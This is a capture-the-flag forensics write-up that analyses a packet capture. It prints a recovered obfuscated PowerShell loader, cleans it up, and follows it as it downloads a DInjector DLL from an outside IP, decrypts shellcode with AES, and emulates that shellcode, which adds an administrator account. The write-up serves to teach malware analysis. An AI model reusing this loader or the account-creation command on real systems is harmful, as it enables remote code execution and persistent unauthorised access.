# Forensics

## Description

During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?
## Solution

![red-failure.png](/assets/ctf/htb/forensics/red-failure.png)

There's quite a lot of traffic on HTTP, we can filter for it via `http`

![red-failure-1.png](/assets/ctf/htb/forensics/red-failure-1.png)

We have few files too -> `File > Export Objects > HTTP`

```bash
└─$ file *
4A7xH.ps1:  ASCII text
9tVI0:      OpenPGP Public Key
user32.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

```powershell
  sV  ("{0}{1}" -f'Y','uE51') ([typE]("{5}{0}{2}{3}{1}{4}"-f 'STeM','EcTIOn.aS','.REF','L','SemblY','Sy'));  ${a} = ("{0}{1}{2}{3}{4}" -f 'cu','rr','en','tth','read')
${B} = ("{1}{0}{3}{2}" -f '.182.1','147','89','72.1')
${C} = 80
${D} = ("{2}{0}{1}" -f '.dl','l','user32')
${E} = ("{1}{0}" -f 'tVI0','9')
${f} = (('z6'+'4&Rx27Z{0}B%'+'7'+'3u'+'p')  -F[cHar]36)
${g} = ((("{8}{5}{3}{1}{2}{0}{7}{4}{6}"-f '2','owsf3h','System3','d','svcho','Win','st.exe','f3h','C:f3h'))."r`EPlAcE"('f3h',[StRINg][ChaR]92))
${h} = ("{0}{1}"-f 'notepa','d')
${I} = ("{1}{0}"-f'xplorer','e')
${j} = ("{1}{0}{2}" -f'_','msvcp','win.dll')
${k} = ("{0}{1}" -f 'Tru','e')
${l} = ("{1}{0}" -f'rue','T')

${Me`Th`ODS} = @(("{1}{0}{2}{3}"-f'ot','rem','et','hread'), ("{2}{0}{1}{3}" -f'mo','tethre','re','addll'), ("{4}{2}{1}{3}{0}" -f'view','hr','otet','ead','rem'), ("{1}{3}{2}{4}{0}"-f 'ed','rem','e','ot','threadsuspend'))
if (${m`E`ThOdS}.("{0}{1}{2}"-f'C','ontain','s').Invoke(${A})) {
    ${h} = (&("{1}{0}{2}{3}" -f'tart-Pro','S','c','ess') -WindowStyle ("{1}{0}{2}"-f 'dd','Hi','en') -PassThru ${H})."I`d"
}

${ME`ThODS} = @(("{2}{0}{4}{3}{1}" -f'mo','dapc','re','ethrea','t'), ("{1}{0}{2}{3}{4}" -f 'adc','remotethre','on','te','xt'), ("{2}{0}{3}{1}" -f'oces','hollow','pr','s'))
if (${m`EthODS}.("{0}{1}{2}"-f 'C','ontain','s').Invoke(${a})) {
    try {
        ${I} = (&("{1}{0}{2}{3}" -f'-Pr','Get','o','cess') ${I} -ErrorAction ("{1}{0}"-f'p','Sto'))."ID"
    }
    catch {
        ${I} = 0
    }
}

${c`MD} = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /blockDlls:${K} /am51:${L}"

${d`AtA} = (.("{0}{1}" -f 'IW','R') -UseBasicParsing "http://${B}:${C}/${D}")."C`ontEnT"
${A`ssEM} =  ( ls ("{1}{3}{2}{0}" -f '1','vaR','5','IaBLe:yUE')  )."Va`LUe"::("{1}{0}"-f'd','Loa').Invoke(${d`AtA})

${fL`AGS} = [Reflection.BindingFlags] ("{1}{2}{3}{4}{0}"-f'tatic','NonPub','l','ic,','S')

${cl`ASs} = ${a`s`SEm}.("{2}{1}{0}" -f 'pe','etTy','G').Invoke(("{0}{3}{1}{4}{2}"-f 'DIn','.Det','r','jector','onato'), ${f`lAgS})
${En`TRY} = ${C`lASS}.("{3}{1}{0}{2}"-f 'e','M','thod','Get').Invoke(("{1}{0}" -f 'om','Bo'), ${f`L`AGS})

${Ent`RY}."I`N`VokE"(${nU`LL}, (, ${c`md}.("{1}{0}" -f 'it','Spl').Invoke(" ")))
```

After some cleanup:
```powershell
Set-Variale "YuE51" ([type]("System.Reflection.Assembly"))
$a = "currentthread"
$B = "147.182.172.189"
$C = 80
$D = "user32.dll"
$E = "9tVI0"
$f = "z64&Rx27Z$B%73up" # z64&Rx27Z147.182.172.189%73up
$g = "C:\Windows\System32\svchost.exe"
$h = "notepad"
$I = "explorer"
$j = "msvcpwin.dll"
$k = "True"
$l = "True"

$methods = @(remotethread,remotethreaddll,remotethreadview,remotethreadsuspended);
if ($methods.Contains.Invoke("currentthread")) {
    $h = (&(Start-Process -WindowStyle Hidden -PassThru "notepad").Id
}

$methods = @("remotethreadapc","remotethreadcontext","processhollow")
if ($methods.Contains.Invoke("currentthread")) {
    try   { ${I} = (&(Get-Process ${I} -ErrorAction Stop).ID }
    catch { ${I} = 0 }
}

$cmd = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:'z64&Rx27Z$B%73up' /image:'C:\Windows\System32\svchost.exe' /pid:${H} /ppid:${I} /dll:'msvcpwin.dll' /blockDlls:True /am51:True"
${data} = . (IWR -UseBasicParsing "http://147.182.172.189:80/user32.dll").Content
${assem} =  ( ls (Variable:YuE51).Value::Load.Invoke(${data})
${flags} = [Reflection.BindingFlags]("NonPublic,Static")
${class} = ${assem}.GetType.Invoke("DInjector.Detonator", ${flags})
${entry} = ${class}.GetMethod.Invoke("Boom", ${flags})

${entry}.Invoke(${null}, (, ${cmd}.Split(" ")))
```

After downloading the malicious `user32.dll` it's loaded into memory and some method called `Boom` is invoked...

Because DLL is written in C# it's easy to decompile it, such as ILSpy or [https://www.decompiler.com/jar/287f06e3716e4208967b58de9b12b5ce/user32.dll](https://www.decompiler.com/jar/287f06e3716e4208967b58de9b12b5ce/user32.dll)

![red-failure-2.png](/assets/ctf/htb/forensics/red-failure-2.png)

This is the main line that's being processed. Boom method has a command line parser so all of the `/arg`'s are passed as arguments to function.
```powershell
$cmd = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z147.182.172.189%73up /image:'C:\Windows\System32\svchost.exe' /pid:${H} /ppid:${I} /dll:'msvcpwin.dll' /blockDlls:True /am51:True"
```

`/sc` is the source from where the payload encoded in Base64 is downloaded from, but it's also AES encrypted. The password for decryption exists in program, after it's decoded it's passed to functions that are able to do `Execute` with decoded arguments.

But the AES decryption is somewhat ~custom
```cs
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace DInjector;

internal class AES {
	private byte[] key;
	
	public AES(string password) {
		key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
	}
	
	private byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data) {
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
		cryptoStream.Write(data, 0, data.Length);
		cryptoStream.FlushFinalBlock();
		return memoryStream.ToArray();
	}
	
	public byte[] Decrypt(byte[] data) {
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		byte[] iV = data.Take(16).ToArray();
		byte[] data2 = data.Skip(16).Take(data.Length - 16).ToArray();
		aesCryptoServiceProvider.Key = key;
		aesCryptoServiceProvider.IV = iV;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		using ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		return PerformCryptography(cryptoTransform, data2);
	}
}
```

```cs
// https://www.programiz.com/csharp-programming/online-compiler/
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System; 

public class AES {
	private byte[] key;
	
	public AES(string password) { key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password)); }
	private byte[] PerformCryptography(ICryptoTransform cryptoTransform, byte[] data) {
		using MemoryStream memoryStream = new MemoryStream();
		using CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Write);
		cryptoStream.Write(data, 0, data.Length);
		cryptoStream.FlushFinalBlock();
		return memoryStream.ToArray();
	}
	
	public byte[] Decrypt(byte[] data) {
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		byte[] iV = data.Take(16).ToArray();
		byte[] data2 = data.Skip(16).Take(data.Length - 16).ToArray();
		aesCryptoServiceProvider.Key = key;
		aesCryptoServiceProvider.IV = iV;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		using ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		return PerformCryptography(cryptoTransform, data2);
	}
	
	public static void Main(string[] args) {
        String dataBase64 = "mQe7Z54XZdy9tGfBxLANITs/cIZ53BLlNS/0rA+732pX5PoJSk0D/7qe8lHCxXEA3wTf+ILc1Dc+DQu6XGtkLE5Nfi5GvSXCDFhlwCf6wMrYoBINPl79Mcjxb7h7+QcYuRtHWS+siDTcGxyS0e+gCH7dZ4dGQhwB1NIqo7YAZJ2qzX8NL36anJBXwT6meYwVj9hD3lVlQqxHfyD2OG31NaXdRhmbFouysT3DLuHJ1LIBR0QtCN/RlBrgNLX/dqifAc3xajXiV5J8qgLStlS7hd4nV6CkJ5NyG7wlfZC3V90IR9Mxd2u2uWgAFo8SIEk4++wAPOmrXpC1vFe5rHnvxAUWMCi9DElNR9tPlz1D3WLfHuuAkQWv/21uig6mU+ycA6YglUmB9lvbRxSrvc8WE/znqETwx5TdK6GBFDX6Yu7Sw9p1NDe8qkcic57DZeHW";
        byte[] data = Convert.FromBase64String(dataBase64);
        String password = "z64&Rx27Z$B%73up";
        byte[] cmdArray = new AES(password).Decrypt(data); 
        Console.WriteLine(BitConverter.ToString(cmdArray).Replace("-", ""));
    }
}
```

I verified the decrypted few times and it should be correct, but we are getting this weird blob of data

![red-failure-3.png](/assets/ctf/htb/forensics/red-failure-3.png)

**[DInjector](https://github.com/rvrsh3ll/DInjector)**: Collection of shellcode injection techniques packed in a D/Invoke weaponized DLL

[rvrsh3ll/DInjector/DInjector/Modules/CurrentThread](https://github.com/rvrsh3ll/DInjector/blob/main/DInjector/Modules/CurrentThread.cs)

![red-failure-4.png](/assets/ctf/htb/forensics/red-failure-4.png)

The `Execute` method is taking `shellcode` and that's why it's not plaintext commands.

I was trying to somehow debug the shellcode on Linux, but no luck.

In HTB Sherlocks chat [BlobRunner](https://github.com/OALabs/BlobRunner) or [shcode2exe](https://github.com/accidentalrebel/shcode2exe) was recommended. `shcode2exe` is Python script and it was able convert the code to exe binary (on Linux), static analysis with Ghidra was hell tho...
It was also recommended to use [xdbg](https://x64dbg.com) if we converted code via [shcode2exe](https://github.com/accidentalrebel/shcode2exe).

I tried running shellcode with `BlobRunner`, attaching xdbg to process, going to thread and doing step manually, but shellcode wasn't working. Kept crashing and crashing 🥴

Then I tried [SHAREM](https://github.com/Bw3ll/sharem), which *is a shellcode analysis framework, capable of emulating more than 20,000 WinAPIs and virtually all Windows syscalls*. (Use `-m32` flag to run shellcode)
But it was also crashing, well looping back to same point where crash was happening. Same with IDA 🥴

Something like `ltrace` or `strace` would be nice to have, where we can observe the calls that binary made.

_[scdbg](http://sandsprite.com/blogs/index.php?uid=7&pid=152) is a shellcode analysis application built around the [libemu emulation](http://libemu.carnivore.it/) library. When run it will display to the user all of the Windows API the shellcode attempts to call._

```powershell
PS C:\Users\Kirin\Desktop> .\scdbg\scdbg.exe -f .\shellcode.bin
Loaded 139 bytes from file .\shellcode.bin
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4010b4  WinExec( net user jmiller "HTB{00000ps_1_t0t4lly_f0rg0t_1t}" /add; net localgroup administrators jmiller /add)
4010c0  GetVersion()
4010d3  ExitProcess(0)

Stepcount 554094
```

> Flag: `HTB{00000ps_1_t0t4lly_f0rg0t_1t}`


---

[https://vincentandreas.medium.com/red-failure-forensic-hackthebox-writeup-cd1731eb7395](https://vincentandreas.medium.com/red-failure-forensic-hackthebox-writeup-cd1731eb7395)
[https://apchavan.medium.com/shellcode-challenges-from-malwaretech-24bab3f1ce22](https://apchavan.medium.com/shellcode-challenges-from-malwaretech-24bab3f1ce22)
[https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Dr.%20Bramwell%20Brizendine%20Max%20Libra%20Kersten%20Jake%20Hince%20-%20Game-Changing%20Advances%20in%20Windows%20Shellcode%20Analysis.pdf](https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Dr.%20Bramwell%20Brizendine%20Max%20Libra%20Kersten%20Jake%20Hince%20-%20Game-Changing%20Advances%20in%20Windows%20Shellcode%20Analysis.pdf)
[https://github.com/Bw3ll/sharem](https://github.com/Bw3ll/sharem)

